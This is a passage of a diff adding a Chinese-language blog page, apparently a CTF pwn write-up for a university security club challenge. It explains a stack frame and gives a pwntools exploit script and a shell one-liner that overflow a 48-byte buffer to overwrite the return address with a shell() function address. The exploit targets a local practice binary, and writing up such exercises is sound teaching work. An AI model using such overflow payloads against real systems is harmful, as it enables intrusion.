+</span></span><span class="line"><span class="cl"> 804851d:	<span class="m">90</span>                   	nop
+</span></span><span class="line"><span class="cl"> 804851e:	c9                   	leave
+</span></span><span class="line"><span class="cl"> 804851f:	c3                   	ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>重點在 line 18 的 <code>ebp-0x30</code> ，必須要掌握變數所在的相對位置，我們把 stack frame 畫成圖大概就是下面這樣 ↓↓↓</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_500/v1618833040/blog-posts/2020-03/20-stack-frame-3.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_500/v1618833040/blog-posts/2020-03/20-stack-frame-3.webp, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_500/v1618833040/blog-posts/2020-03/20-stack-frame-3.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_500/v1618833040/blog-posts/2020-03/20-stack-frame-3.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_500/v1618833040/blog-posts/2020-03/20-stack-frame-3.webp"
+        title=" " /></p>
+<p>也就是說，這題希望我們除了把<code>str[48]</code>填滿
+還要利用Buffer Overflow的方式把<code>shell()</code>的address蓋到return上。</p>
+<p>再來就是要知道line 1 <code>shell()</code>的function address
+假如我們通通用&quot;a&quot;進行覆蓋，預期結果將會長這樣：）
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_500/v1618833040/blog-posts/2020-03/20-stack-frame-4.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_500/v1618833040/blog-posts/2020-03/20-stack-frame-4.webp, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_500/v1618833040/blog-posts/2020-03/20-stack-frame-4.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_500/v1618833040/blog-posts/2020-03/20-stack-frame-4.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_500/v1618833040/blog-posts/2020-03/20-stack-frame-4.webp"
+        title=" " /></p>
+<br>
+<p>既然知道要怎麼蓋return address，剩下的就是寫payload了。</p>
+<div class="highlight" filename="exploit.py"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conn</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./bof&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># payload分成三個部分: 填滿str[48], 覆蓋old ebp, 拿shell()覆蓋return address</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 要注意由於32位元是little-endian, 所以要用p32()轉成\xeb\x84\x04\x08的格式</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">48</span> <span class="o">+</span> <span class="s1">&#39;aaaa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080484eb</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>這樣就能拿到root權限讀flag，當然如果懶得開檔案寫code，也是有一行流寫法XD</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="o">(</span>python -c <span class="s2">&#34;print(&#39;a&#39;*48 + &#39;a&#39;*4 + &#39;\xeb\x84\x04\x08&#39;)&#34;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./bof
+</span></span></code></pre></div><br>
+<p>大概就是這麼一回事了~<br>
+寫的比預期還要久，而且原本想一篇講個三題，結果第一題介紹太久了QQ</p>
+<p>就醬，希望我還能繼續把題目補完（逃</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-03-22</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2020/nsysuisc-pwn-01/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/nsysuisc-%E4%B8%AD%E5%B1%B1%E8%B3%87%E5%AE%89%E7%A4%BE/">NSYSUISC 中山資安社</a>,&nbsp;<a href="/tags/pwn-challenge/">Pwn Challenge</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2019/codeforces-april-fools-day-2019/" class="prev" rel="prev" title="[Codeforces] April Fools Day Contest 2019"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[Codeforces] April Fools Day Contest 2019</a>
+            <a href="/posts/2020/tjctf-2020-weakpassword/" class="next" rel="next" title="[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)">[Writeup] TJCTF 2020 - Weak Password (Blind SQL injection)<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.120.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.cyris.tw" target="_blank">Cyris Tseng</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"Comment 💬","lightTheme":"github-light","repo":"yctseng1227/blog-comments"}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
